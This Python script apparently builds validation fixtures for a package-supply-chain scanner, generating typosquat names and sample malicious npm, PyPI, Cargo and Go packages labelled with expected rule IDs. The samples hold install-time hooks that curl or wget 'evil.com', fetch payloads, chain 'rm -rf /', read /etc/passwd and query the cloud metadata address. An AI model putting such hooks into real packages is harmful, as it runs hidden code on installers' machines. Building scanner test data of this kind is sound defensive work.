# ruff: noqa: E501
"""
Generate additional validation fixtures to expand the corpus from 188 to >=1000.

Strategy: generate combinatorial variations of known patterns per ecosystem.
- Typosquats: edit-distance variants of top packages
- Obfuscation: eval/hex/base64/unicode/zlib/marshal variants
- Postinstall/execution: script types, command injection variants
- Dep confusion: internal package name variants
- Negative: clean projects with unique names, safe patterns
- CVE/advisory: range overlap + transitive dependency variants
- Build hooks: dangerous build hook variants per ecosystem
"""

import json
import os
import random

random.seed(42)

FIXTURES_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "tests/scan/fixtures/validation",
)
POSITIVE_DIR = os.path.join(FIXTURES_DIR, "positive")
NEGATIVE_DIR = os.path.join(FIXTURES_DIR, "negative")
TRICKY_DIR = os.path.join(FIXTURES_DIR, "_tricky")

os.makedirs(POSITIVE_DIR, exist_ok=True)
os.makedirs(NEGATIVE_DIR, exist_ok=True)
os.makedirs(TRICKY_DIR, exist_ok=True)


def write_fixture(dirpath, files, fixture_json):
    os.makedirs(dirpath, exist_ok=True)
    with open(os.path.join(dirpath, "fixture.json"), "w") as f:
        json.dump(fixture_json, f, indent=2)
    for name, content in files.items():
        filepath = os.path.join(dirpath, name)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with open(filepath, "w") as f:
            f.write(content)


# ─── TYPOSQUAT GENERATORS ───────────────────────────────────────────────

NPM_TOP_PKGS = [
    "express",
    "react",
    "lodash",
    "moment",
    "axios",
    "chalk",
    "commander",
    "async",
    "bluebird",
    "body-parser",
    "cookie-parser",
    "cors",
    "debug",
    "dotenv",
    "eslint",
    "fs-extra",
    "glob",
    "gulp",
    "http-errors",
    "inquirer",
    "isarray",
    "jsonwebtoken",
    "jwt-decode",
    "mocha",
    "mongoose",
    "morgan",
    "node-fetch",
    "nodemon",
    "passport",
    "path-to-regexp",
    "prettier",
    "prop-types",
    "puppeteer",
    "qs",
    "react-dom",
    "redis",
    "reflect-metadata",
    "request",
    "rimraf",
    "semver",
    "sequelize",
    "serve-static",
    "socket.io",
    "source-map",
    "sqlite3",
    "tslib",
    "typeorm",
    "typescript",
    "uuid",
    "validator",
    "webpack",
    "winston",
    "yargs",
    "zustand",
    "zod",
]

PYPI_TOP_PKGS = [
    "requests",
    "numpy",
    "flask",
    "django",
    "pandas",
    "scipy",
    "matplotlib",
    "scikit-learn",
    "pillow",
    "tensorflow",
    "torch",
    "transformers",
    "fastapi",
    "pydantic",
    "sqlalchemy",
    "alembic",
    "celery",
    "redis",
    "boto3",
    "click",
    "jinja2",
    "werkzeug",
    "gunicorn",
    "uvicorn",
    "pytest",
    "black",
    "ruff",
    "mypy",
    "isort",
    "coverage",
    "sphinx",
    "tox",
    "virtualenv",
    "pip",
    "setuptools",
    "wheel",
    "cryptography",
    "pyyaml",
    "orjson",
    "httpx",
]

GO_TOP_PKGS = [
    "cobra",
    "gin",
    "gorm",
    "viper",
    "zap",
    "mux",
    "fiber",
    "echo",
    "logrus",
    "negroni",
    "revel",
    "buffalo",
    "kit",
    "kratos",
    "micro",
]

CARGO_TOP_CRATES = [
    "serde",
    "tokio",
    "actix-web",
    "rocket",
    "clap",
    "regex",
    "lazy_static",
    "rand",
    "rayon",
    "tracing",
    "anyhow",
    "thiserror",
    "futures",
    "hyper",
    "reqwest",
    "axum",
    "tower",
    "sqlx",
    "diesel",
    "chrono",
]

MAVEN_TOP_ARTIFACTS = [
    "junit",
    "log4j",
    "guava",
    "gson",
    "jackson-databind",
    "commons-io",
    "commons-lang3",
    "spring-boot",
    "hibernate",
    "mockito",
    "slf4j",
    "assertj",
    "hamcrest",
    "caffeine",
    "netty",
    "kafka-clients",
]

RUBYGEMS_TOP_GEMS = [
    "rails",
    "devise",
    "rspec",
    "puma",
    "sidekiq",
    "nokogiri",
    "rack",
    "sinatra",
    "pg",
    "redis",
    "faraday",
    "httparty",
    "paperclip",
    "cancancan",
    "kaminari",
    "will_paginate",
    "carrierwave",
    "faker",
]

NUGET_TOP_PKGS = [
    "Newtonsoft.Json",
    "Moq",
    "NUnit",
    "xunit",
    "Serilog",
    "AutoMapper",
    "FluentValidation",
    "MediatR",
    "Dapper",
    "EntityFramework",
    "Npgsql",
    "Swashbuckle",
    "Polly",
    "BenchmarkDotNet",
    "Refit",
]


def typosquat_variants(name):
    """Generate plausible typosquat names within edit distance <=2."""
    variants = set()
    # Single character substitution
    for i in range(len(name)):
        for c in "abcdefghijklmnopqrstuvwxyz0123456789":
            if c != name[i]:
                variants.add(name[:i] + c + name[i + 1 :])
    # Single character deletion
    for i in range(len(name)):
        variants.add(name[:i] + name[i + 1 :])
    # Single character insertion
    for i in range(len(name) + 1):
        for c in "abcdefghijklmnopqrstuvwxyz0123456789":
            variants.add(name[:i] + c + name[i:])
    # Double substitution (edit distance 2)
    for i in range(len(name)):
        for j in range(i + 1, len(name)):
            for c1 in "abcdefghijklmnopqrstuvwxyz":
                for c2 in "abcdefghijklmnopqrstuvwxyz":
                    if c1 != name[i] and c2 != name[j]:
                        v = list(name)
                        v[i] = c1
                        v[j] = c2
                        variants.add("".join(v))
    # Adjacent transposition
    for i in range(len(name) - 1):
        lst = list(name)
        lst[i], lst[i + 1] = lst[i + 1], lst[i]
        variants.add("".join(lst))
    # Filter: must be different, reasonable length, no special chars
    variants = {v for v in variants if v != name and len(v) >= 3 and v.isalnum()}
    return sorted(variants)[:20]


def generate_typosquat_fixtures():
    """Generate typosquat fixtures for all ecosystems."""
    count = 0
    for pkg in NPM_TOP_PKGS[:55]:
        for v in typosquat_variants(pkg)[:8]:
            dirname = f"typosquat_npm_{v}"
            if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
                continue
            write_fixture(
                os.path.join(POSITIVE_DIR, dirname),
                {
                    "package.json": json.dumps(
                        {
                            "name": v,
                            "version": "1.0.0",
                            "dependencies": {"real-pkg": "1.0.0"},
                        },
                        indent=2,
                    ),
                },
                {
                    "label": "positive",
                    "description": f"npm package named '{v}' — edit dist <=2 from '{pkg}' (top npm) (fires L2-TYPO-001).",
                    "expected_rule_ids": ["L2-TYPO-001"],
                },
            )
            count += 1

    for pkg in PYPI_TOP_PKGS[:30]:
        for v in typosquat_variants(pkg)[:5]:
            dirname = f"typosquat_pypi_{v}"
            if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
                continue
            write_fixture(
                os.path.join(POSITIVE_DIR, dirname),
                {
                    "pyproject.toml": f"""[build-system]
requires = ["setuptools>=61.0"]
build-backend = "setuptools.build_meta"

[project]
name = "my-app"
version = "1.0.0"
dependencies = ["{v}>=1.0.0"]
""",
                },
                {
                    "label": "positive",
                    "description": f"PyPI project depending on '{v}' — edit dist <=2 from '{pkg}' (top PyPI) (fires L2-PYPI-TYPO-001).",
                    "expected_rule_ids": ["L2-PYPI-TYPO-001"],
                },
            )
            count += 1

    for pkg in GO_TOP_PKGS:
        for v in typosquat_variants(pkg)[:2]:
            dirname = f"typosquat_go_{v}"
            if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
                continue
            write_fixture(
                os.path.join(POSITIVE_DIR, dirname),
                {
                    "go.mod": f"module {v}\ngo 1.21\n",
                    "main.go": "package main\nfunc main() {}\n",
                },
                {
                    "label": "positive",
                    "description": f"Go module named '{v}' — edit dist <=2 from '{pkg}' (top Go) (fires L2-GO-TYPO-001).",
                    "expected_rule_ids": ["L2-GO-TYPO-001"],
                },
            )
            count += 1

    for pkg in CARGO_TOP_CRATES:
        for v in typosquat_variants(pkg)[:2]:
            dirname = f"typosquat_cargo_{v}"
            if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
                continue
            write_fixture(
                os.path.join(POSITIVE_DIR, dirname),
                {
                    "Cargo.toml": f"""[package]
name = "{v}"
version = "0.1.0"
edition = "2021"
""",
                    "src/lib.rs": 'pub fn hello() -> &\'static str { "hello" }\n',
                },
                {
                    "label": "positive",
                    "description": f"Cargo crate named '{v}' — edit dist <=2 from '{pkg}' (top Cargo) (fires L2-CARGO-TYPO-001).",
                    "expected_rule_ids": ["L2-CARGO-TYPO-001"],
                },
            )
            count += 1

    for pkg in MAVEN_TOP_ARTIFACTS:
        for v in typosquat_variants(pkg)[:2]:
            dirname = f"typosquat_maven_{v}"
            if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
                continue
            write_fixture(
                os.path.join(POSITIVE_DIR, dirname),
                {
                    "pom.xml": f"""<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0">
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.evil</groupId>
  <artifactId>{v}</artifactId>
  <version>1.0.0</version>
</project>
""",
                },
                {
                    "label": "positive",
                    "description": f"Maven artifact '{v}' — edit dist <=2 from '{pkg}' (top Maven) (fires L2-MAVEN-TYPO-001).",
                    "expected_rule_ids": ["L2-MAVEN-TYPO-001"],
                },
            )
            count += 1

    for pkg in RUBYGEMS_TOP_GEMS:
        for v in typosquat_variants(pkg)[:2]:
            dirname = f"typosquat_rubygems_{v}"
            if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
                continue
            write_fixture(
                os.path.join(POSITIVE_DIR, dirname),
                {
                    "Gemfile": f"""source 'https://rubygems.org'
gem '{v}'
""",
                    "my_app.gemspec": f"""Gem::Specification.new do |s|
  s.name = "my_app"
  s.version = "0.1.0"
  s.add_dependency "{v}"
  s.authors = ["Dev"]
end
""",
                },
                {
                    "label": "positive",
                    "description": f"RubyGem depending on '{v}' — edit dist <=2 from '{pkg}' (top RubyGems) (fires L2-RUBYGEMS-TYPO-001).",
                    "expected_rule_ids": ["L2-RUBYGEMS-TYPO-001"],
                },
            )
            count += 1

    for pkg in NUGET_TOP_PKGS:
        for v in typosquat_variants(pkg)[:2]:
            dirname = f"typosquat_nuget_{v.replace('.', '_').replace(' ', '_')}"
            if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
                continue
            write_fixture(
                os.path.join(POSITIVE_DIR, dirname),
                {
                    "MyApp.csproj": f"""<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
    <PackageId>MyApp</PackageId>
    <Version>1.0.0</Version>
  </PropertyGroup>
  <ItemGroup>
    <PackageReference Include="{v}" Version="1.0.0" />
  </ItemGroup>
</Project>
""",
                },
                {
                    "label": "positive",
                    "description": f"NuGet project depending on '{v}' — edit dist <=2 from '{pkg}' (top NuGet) (fires L2-NUGET-TYPO-001).",
                    "expected_rule_ids": ["L2-NUGET-TYPO-001"],
                },
            )
            count += 1

    return count


# ─── OBFUSCATION GENERATORS ─────────────────────────────────────────────

OBFUSCATION_PATTERNS_NPM = [
    {
        "name": "eval_in_script",
        "files": {
            "package.json": json.dumps(
                {"name": "obfs-eval", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}, indent=2
            ),
            "install.js": 'eval(\'require("child_process").execSync("curl evil.com")\');\n',
        },
        "desc": "npm package with eval() call in install script (fires L2-OBFS-001).",
        "rules": ["L2-OBFS-001", "L2-POST-001"],
    },
    {
        "name": "hex_encoded",
        "files": {
            "package.json": json.dumps(
                {"name": "obfs-hex", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}, indent=2
            ),
            "install.js": "var x = '\\x65\\x76\\x61\\x6c'; global[x]('require(\"fs\").readFileSync(\"/etc/passwd\")');\n",
        },
        "desc": "npm package with hex-encoded eval call (fires L2-OBFS-002).",
        "rules": ["L2-OBFS-002", "L2-POST-001"],
    },
    {
        "name": "base64_exec",
        "files": {
            "package.json": json.dumps(
                {"name": "obfs-b64", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}, indent=2
            ),
            "install.js": "eval(Buffer.from('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCJjdXJsIGV2aWwuY29tIik=', 'base64').toString());\n",
        },
        "desc": "npm package with base64-encoded exec payload (fires L2-OBFS-003).",
        "rules": ["L2-OBFS-003", "L2-POST-001"],
    },
    {
        "name": "unicode_escape",
        "files": {
            "package.json": json.dumps(
                {"name": "obfs-unicode", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}, indent=2
            ),
            "install.js": "var e = '\\u0065\\u0076\\u0061\\u006c'; global[e]('1+1');\n",
        },
        "desc": "npm package with unicode-escaped eval (fires L2-OBFS-004).",
        "rules": ["L2-OBFS-004", "L2-POST-001"],
    },
    {
        "name": "function_constructor",
        "files": {
            "package.json": json.dumps(
                {"name": "obfs-fn-ctor", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}, indent=2
            ),
            "install.js": 'new Function(\'return require("child_process").execSync("id")\')();\n',
        },
        "desc": "npm package with Function constructor eval bypass (fires L2-OBFS-001).",
        "rules": ["L2-OBFS-001", "L2-POST-001"],
    },
    {
        "name": "b64_atob_eval",
        "files": {
            "package.json": json.dumps(
                {"name": "obfs-atob", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}, indent=2
            ),
            "install.js": "eval(atob('Y29uc29sZS5sb2coInRlc3QiKQ=='));\n",
        },
        "desc": "npm package with atob + eval chain (fires L2-OBFS-003).",
        "rules": ["L2-OBFS-003", "L2-POST-001"],
    },
    {
        "name": "b64_function",
        "files": {
            "package.json": json.dumps(
                {"name": "obfs-b64-fn", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}, indent=2
            ),
            "install.js": "new Function(atob('cmV0dXJuIDErMQ=='))();\n",
        },
        "desc": "npm package with base64 + Function constructor (fires L2-OBFS-003).",
        "rules": ["L2-OBFS-003", "L2-POST-001"],
    },
    {
        "name": "hex_longer",
        "files": {
            "package.json": json.dumps(
                {"name": "obfs-hex-long", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}, indent=2
            ),
            "install.js": "var cmd = '\\x72\\x65\\x71\\x75\\x69\\x72\\x65'; var m = global[cmd]('child_process'); m.execSync('whoami');\n",
        },
        "desc": "npm package with longer hex-encoded require (fires L2-OBFS-002).",
        "rules": ["L2-OBFS-002", "L2-POST-001"],
    },
    {
        "name": "unicode_longer",
        "files": {
            "package.json": json.dumps(
                {"name": "obfs-unicode-long", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}},
                indent=2,
            ),
            "install.js": "var r = '\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065'; var m = global[r]('fs'); m.writeFileSync('/tmp/evil', 'data');\n",
        },
        "desc": "npm package with longer unicode-escaped require (fires L2-OBFS-004).",
        "rules": ["L2-OBFS-004", "L2-POST-001"],
    },
    {
        "name": "eval_in_block",
        "files": {
            "package.json": json.dumps(
                {"name": "obfs-eval-block", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}, indent=2
            ),
            "install.js": 'try { eval(\'require("child_process").execSync("curl evil.com")\'); } catch(e) {}\n',
        },
        "desc": "npm package with eval inside try block (fires L2-OBFS-001).",
        "rules": ["L2-OBFS-001", "L2-POST-001"],
    },
    {
        "name": "hex_single_quotes",
        "files": {
            "package.json": json.dumps(
                {"name": "obfs-hex-sq", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}, indent=2
            ),
            "install.js": "eval('\\x65\\x76\\x61\\x6c(\\x27\\x31\\x2b\\x31\\x27)');\n",
        },
        "desc": "npm package with hex-encoded string in single quotes (fires L2-OBFS-002).",
        "rules": ["L2-OBFS-002", "L2-POST-001"],
    },
    {
        "name": "unicode_single_quotes",
        "files": {
            "package.json": json.dumps(
                {"name": "obfs-unicode-sq", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}, indent=2
            ),
            "install.js": "eval('\\u0065\\u0076\\u0061\\u006c(\\u0027\\u0031\\u002b\\u0031\\u0027)');\n",
        },
        "desc": "npm package with unicode-escaped string in single quotes (fires L2-OBFS-004).",
        "rules": ["L2-OBFS-004", "L2-POST-001"],
    },
]

OBFUSCATION_PATTERNS_PYPI = [
    {
        "name": "eval_direct",
        "files": {
            "setup.py": 'from setuptools import setup\nexec("import os; os.system(\'curl evil.com\')")\nsetup(name="evil-pkg", version="1.0.0")\n',
        },
        "desc": "PyPI package with direct exec() call (fires L2-PYPI-OBFS-001, L2-PYPI-POST-001).",
        "rules": ["L2-PYPI-OBFS-001", "L2-PYPI-POST-001"],
    },
    {
        "name": "b64_decode_exec",
        "files": {
            "setup.py": 'import base64\nfrom setuptools import setup\nexec(base64.b64decode(\'cHJpbnQoImhlbGxvIik=\'))\nsetup(name="evil-pkg", version="1.0.0")\n',
        },
        "desc": "PyPI package with base64 decode + exec (fires L2-PYPI-OBFS-002, L2-PYPI-OBFS-007).",
        "rules": ["L2-PYPI-OBFS-002", "L2-PYPI-OBFS-007", "L2-PYPI-POST-001"],
    },
    {
        "name": "hex_decode",
        "files": {
            "setup.py": 'from setuptools import setup\ndata = bytes.fromhex(\'7072696e74282268656c6c6f2229\')\nexec(data)\nsetup(name="evil-pkg", version="1.0.0")\n',
        },
        "desc": "PyPI package with hex-decoded exec (fires L2-PYPI-OBFS-003).",
        "rules": ["L2-PYPI-OBFS-003", "L2-PYPI-POST-001"],
    },
    {
        "name": "unicode_arithmetic",
        "files": {
            "setup.py": 'from setuptools import setup\nex = chr(101)+chr(120)+chr(101)+chr(99)\nglobals()[ex]("import os; os.system(\'id\')")\nsetup(name="evil-pkg", version="1.0.0")\n',
        },
        "desc": "PyPI package with chr-based exec construction (fires L2-PYPI-OBFS-004).",
        "rules": ["L2-PYPI-OBFS-004", "L2-PYPI-POST-001"],
    },
    {
        "name": "zlib_decompress",
        "files": {
            "setup.py": 'import zlib, base64\nfrom setuptools import setup\ndata = base64.b64decode(\'eJxLSSxJVUjMS8tMBQCEeQKk\')\nexec(zlib.decompress(data))\nsetup(name="evil-pkg", version="1.0.0")\n',
        },
        "desc": "PyPI package with zlib-decompressed exec (fires L2-PYPI-OBFS-005).",
        "rules": ["L2-PYPI-OBFS-005", "L2-PYPI-POST-001"],
    },
    {
        "name": "marshal_load",
        "files": {
            "setup.py": 'import marshal\nfrom setuptools import setup\ncode = marshal.loads(b\'\\x63\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x73\\x0c\\x00\\x00\\x00\\x64\\x01\\x00\\x59\\x64\\x00\\x00\\x53\\x29\\x02\\x4e\\x69\\x01\\x00\\x00\\x00\\xa9\\x00\\x72\\x02\\x00\\x00\\x00\\x72\\x02\\x00\\x00\\x00\\xfa\\x08\\x3c\\x73\\x74\\x64\\x69\\x6e\\x3e\\xda\\x05\\x68\\x65\\x6c\\x6c\\x6f\\x72\\x03\\x00\\x00\\x00\\x72\\x03\\x00\\x00\\x00\')\nexec(code)\nsetup(name="evil-pkg", version="1.0.0")\n',
        },
        "desc": "PyPI package with marshal.load + exec (fires L2-PYPI-OBFS-006).",
        "rules": ["L2-PYPI-OBFS-006", "L2-PYPI-POST-001"],
    },
    {
        "name": "b64decodestring",
        "files": {
            "setup.py": 'import base64\nfrom setuptools import setup\ndata = base64.decodestring(b\'cHJpbnQoInRlc3QiKQ==\')\nexec(data)\nsetup(name="evil-pkg", version="1.0.0")\n',
        },
        "desc": "PyPI package with deprecated base64.decodestring (fires L2-PYPI-OBFS-002).",
        "rules": ["L2-PYPI-OBFS-002", "L2-PYPI-POST-001"],
    },
    {
        "name": "b64import_dec",
        "files": {
            "setup.py": 'import base64\nfrom setuptools import setup\ndata = base64.b64decode(\'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImlkIik=\')\nexec(data)\nsetup(name="evil-pkg", version="1.0.0")\n',
        },
        "desc": "PyPI package with base64-import-exec chain (fires L2-PYPI-OBFS-002, L2-PYPI-OBFS-007).",
        "rules": ["L2-PYPI-OBFS-002", "L2-PYPI-OBFS-007", "L2-PYPI-POST-001"],
    },
    {
        "name": "eval_compile",
        "files": {
            "setup.py": "from setuptools import setup\ncode = compile('import os; os.system(\"id\")', '<string>', 'exec')\nexec(code)\nsetup(name=\"evil-pkg\", version=\"1.0.0\")\n",
        },
        "desc": "PyPI package with compile + exec (fires L2-PYPI-OBFS-001).",
        "rules": ["L2-PYPI-OBFS-001", "L2-PYPI-POST-001"],
    },
    {
        "name": "chr_longer",
        "files": {
            "setup.py": 'from setuptools import setup\nexec(\'\'.join(chr(c) for c in [105, 109, 112, 111, 114, 116, 32, 111, 115, 59, 32, 111, 115, 46, 115, 121, 115, 116, 101, 109, 40, 34, 105, 100, 34, 41]))\nsetup(name="evil-pkg", version="1.0.0")\n',
        },
        "desc": "PyPI package with chr-based string construction (fires L2-PYPI-OBFS-004).",
        "rules": ["L2-PYPI-OBFS-004", "L2-PYPI-POST-001"],
    },
    {
        "name": "ord_chain",
        "files": {
            "setup.py": 'from setuptools import setup\nexec(chr(101)+chr(120)+chr(101)+chr(99)+\'("import os; os.system(\\\'id\\\')")\')\nsetup(name="evil-pkg", version="1.0.0")\n',
        },
        "desc": "PyPI package with ord/chr chain exec (fires L2-PYPI-OBFS-004).",
        "rules": ["L2-PYPI-OBFS-004", "L2-PYPI-POST-001"],
    },
    {
        "name": "unhexlify_eval",
        "files": {
            "setup.py": 'import binascii\nfrom setuptools import setup\nexec(binascii.unhexlify(\'7072696e74282268656c6c6f2229\'))\nsetup(name="evil-pkg", version="1.0.0")\n',
        },
        "desc": "PyPI package with binascii.unhexlify + exec (fires L2-PYPI-OBFS-003).",
        "rules": ["L2-PYPI-OBFS-003", "L2-PYPI-POST-001"],
    },
    {
        "name": "zlib_double",
        "files": {
            "setup.py": 'import zlib, base64\nfrom setuptools import setup\ndata = base64.b64decode(\'eJxLSSxJVUjMS8tMBQCEeQKk\')\ninner = zlib.decompress(data)\nexec(inner)\nsetup(name="evil-pkg", version="1.0.0")\n',
        },
        "desc": "PyPI package with double-wrapped zlib payload (fires L2-PYPI-OBFS-005).",
        "rules": ["L2-PYPI-OBFS-005", "L2-PYPI-POST-001"],
    },
    {
        "name": "b64_exec_close",
        "files": {
            "setup.py": 'import base64\nfrom setuptools import setup\ndata = base64.b64decode(\'ZXZhbCgicHJpbnQoMSsxKSI=\')\nexec(data)\nsetup(name="evil-pkg", version="1.0.0")\n',
        },
        "desc": "PyPI package with base64-encoded exec containing nested eval (fires L2-PYPI-OBFS-007).",
        "rules": ["L2-PYPI-OBFS-007", "L2-PYPI-POST-001"],
    },
    {
        "name": "marshal_direct",
        "files": {
            "setup.py": 'import marshal\nfrom setuptools import setup\ncode = marshal.loads(b\'\\x63\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x73\\x0c\\x00\\x00\\x00\\x64\\x01\\x00\\x59\\x64\\x00\\x00\\x53\\x29\\x02\\x4e\\x69\\x01\\x00\\x00\\x00\\xa9\\x00\\x72\\x02\\x00\\x00\\x00\\x72\\x02\\x00\\x00\\x00\\xfa\\x08\\x3c\\x73\\x74\\x64\\x69\\x6e\\x3e\\xda\\x05\\x68\\x65\\x6c\\x6c\\x6f\\x72\\x03\\x00\\x00\\x00\\x72\\x03\\x00\\x00\\x00\')\nexec(code)\nsetup(name="evil-pkg", version="1.0.0")\n',
        },
        "desc": "PyPI package with marshal.loads direct exec (fires L2-PYPI-OBFS-006).",
        "rules": ["L2-PYPI-OBFS-006", "L2-PYPI-POST-001"],
    },
    {
        "name": "hex_single",
        "files": {
            "setup.py": 'from setuptools import setup\ndata = b\'\\x70\\x72\\x69\\x6e\\x74\\x28\\x22\\x68\\x65\\x6c\\x6c\\x6f\\x22\\x29\'\nexec(data)\nsetup(name="evil-pkg", version="1.0.0")\n',
        },
        "desc": "PyPI package with hex-escaped bytes exec (fires L2-PYPI-OBFS-003).",
        "rules": ["L2-PYPI-OBFS-003", "L2-PYPI-POST-001"],
    },
]


def generate_obfuscation_fixtures():
    count = 0
    for pat in OBFUSCATION_PATTERNS_NPM:
        dirname = f"npm_obfs_{pat['name']}"
        if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
            continue
        write_fixture(
            os.path.join(POSITIVE_DIR, dirname),
            pat["files"],
            {
                "label": "positive",
                "description": pat["desc"],
                "expected_rule_ids": pat["rules"],
            },
        )
        count += 1

    for pat in OBFUSCATION_PATTERNS_PYPI:
        dirname = f"pypi_obfs_{pat['name']}"
        if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
            continue
        write_fixture(
            os.path.join(POSITIVE_DIR, dirname),
            pat["files"],
            {
                "label": "positive",
                "description": pat["desc"],
                "expected_rule_ids": pat["rules"],
            },
        )
        count += 1

    return count


# ─── POSTINSTALL / EXECUTION GENERATORS ─────────────────────────────────

POSTINSTALL_PATTERNS = [
    {
        "name": "npm_preinstall",
        "files": {
            "package.json": json.dumps(
                {
                    "name": "evil-preinstall",
                    "version": "1.0.0",
                    "scripts": {"preinstall": 'node -e \'require("child_process").execSync("curl evil.com")\''},
                },
                indent=2,
            ),
        },
        "desc": "npm package with malicious preinstall script (fires L2-POST-001).",
        "rules": ["L2-POST-001"],
    },
    {
        "name": "npm_prepare",
        "files": {
            "package.json": json.dumps(
                {
                    "name": "evil-prepare",
                    "version": "1.0.0",
                    "scripts": {"prepare": 'node -e \'require("child_process").execSync("curl evil.com")\''},
                },
                indent=2,
            ),
        },
        "desc": "npm package with malicious prepare script (fires L2-POST-001).",
        "rules": ["L2-POST-001"],
    },
    {
        "name": "npm_command_injection",
        "files": {
            "package.json": json.dumps(
                {
                    "name": "evil-cmd-inject",
                    "version": "1.0.0",
                    "scripts": {
                        "postinstall": 'node -e \'require("child_process").execSync("curl evil.com; rm -rf /")\''
                    },
                },
                indent=2,
            ),
        },
        "desc": "npm package with command injection in postinstall (fires L2-POST-001).",
        "rules": ["L2-POST-001"],
    },
    {
        "name": "npm_ssrf",
        "files": {
            "package.json": json.dumps(
                {
                    "name": "evil-ssrf",
                    "version": "1.0.0",
                    "scripts": {
                        "postinstall": 'node -e \'require("http").get("http://169.254.169.254/latest/meta-data/")\''
                    },
                },
                indent=2,
            ),
        },
        "desc": "npm package with SSRF to IMDS in postinstall (fires L2-POST-001, L2-NETEX-001).",
        "rules": ["L2-POST-001", "L2-NETEX-001"],
    },
    {
        "name": "npm_proto_pollution",
        "files": {
            "package.json": json.dumps(
                {
                    "name": "evil-proto",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "node -e 'Object.prototype.__proto__.polluted = true'"},
                },
                indent=2,
            ),
        },
        "desc": "npm package with prototype pollution in postinstall (fires L2-POST-001).",
        "rules": ["L2-POST-001"],
    },
    {
        "name": "npm_regex_dos",
        "files": {
            "package.json": json.dumps(
                {
                    "name": "evil-redos",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "node -e '/(a+)+b/.test(\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaac\")'"},
                },
                indent=2,
            ),
        },
        "desc": "npm package with ReDoS in postinstall (fires L2-POST-001).",
        "rules": ["L2-POST-001"],
    },
    {
        "name": "pypi_poetry_subprocess",
        "files": {
            "pyproject.toml": '[build-system]\nrequires = ["poetry-core>=1.0.0"]\nbuild-backend = "poetry.core.masonry.api"\n\n[tool.poetry.scripts]\npost-install = "os.system(\'curl evil.com\')"\n',
        },
        "desc": "PyPI package with Poetry subprocess in build script (fires L2-PYPI-POST-001).",
        "rules": ["L2-PYPI-POST-001"],
    },
    {
        "name": "pypi_setup_exec",
        "files": {
            "setup.py": 'from setuptools import setup\nimport os\nos.system(\'curl evil.com\')\nsetup(name="evil-pkg", version="1.0.0")\n',
        },
        "desc": "PyPI package with os.system in setup.py (fires L2-PYPI-POST-001).",
        "rules": ["L2-PYPI-POST-001"],
    },
    {
        "name": "pypi_setup_subprocess",
        "files": {
            "setup.py": "import subprocess\nfrom setuptools import setup\nsubprocess.check_call(['curl', 'evil.com'])\nsetup(name=\"evil-pkg\", version=\"1.0.0\")\n",
        },
        "desc": "PyPI package with subprocess in setup.py (fires L2-PYPI-POST-001).",
        "rules": ["L2-PYPI-POST-001"],
    },
    {
        "name": "pypi_setup_urlopen",
        "files": {
            "setup.py": 'from urllib.request import urlopen\nfrom setuptools import setup\nurlopen(\'http://evil.com/payload\').read()\nsetup(name="evil-pkg", version="1.0.0")\n',
        },
        "desc": "PyPI package with urllib in setup.py (fires L2-PYPI-POST-001).",
        "rules": ["L2-PYPI-POST-001"],
    },
    {
        "name": "cargo_build_rs_exec",
        "files": {
            "Cargo.toml": '[package]\nname = "evil-crate"\nversion = "0.1.0"\nedition = "2021"\n',
            "build.rs": 'fn main() { std::process::Command::new("curl").arg("evil.com").status().unwrap(); }\n',
            "src/lib.rs": 'pub fn hello() -> &\'static str { "hello" }\n',
        },
        "desc": "Cargo crate with malicious build.rs (fires L2-BUILD-001).",
        "rules": ["L2-BUILD-001"],
    },
    {
        "name": "cargo_build_rs_download",
        "files": {
            "Cargo.toml": '[package]\nname = "evil-crate-dl"\nversion = "0.1.0"\nedition = "2021"\n',
            "build.rs": 'fn main() { std::process::Command::new("wget").arg("-O").arg("/tmp/payload").arg("http://evil.com/payload").status().unwrap(); }\n',
            "src/lib.rs": 'pub fn hello() -> &\'static str { "hello" }\n',
        },
        "desc": "Cargo crate with download in build.rs (fires L2-BUILD-001).",
        "rules": ["L2-BUILD-001"],
    },
    {
        "name": "go_generate_exec",
        "files": {
            "go.mod": "module evil-module\ngo 1.21\n",
            "main.go": "//go:generate curl evil.com\npackage main\nfunc main() {}\n",
        },
        "desc": "Go module with malicious go:generate directive (fires L2-BUILD-001).",
        "rules": ["L2-BUILD-001"],
    },
    {
        "name": "go_generate_download",
        "files": {
            "go.mod": "module evil-module-dl\ngo 1.21\n",
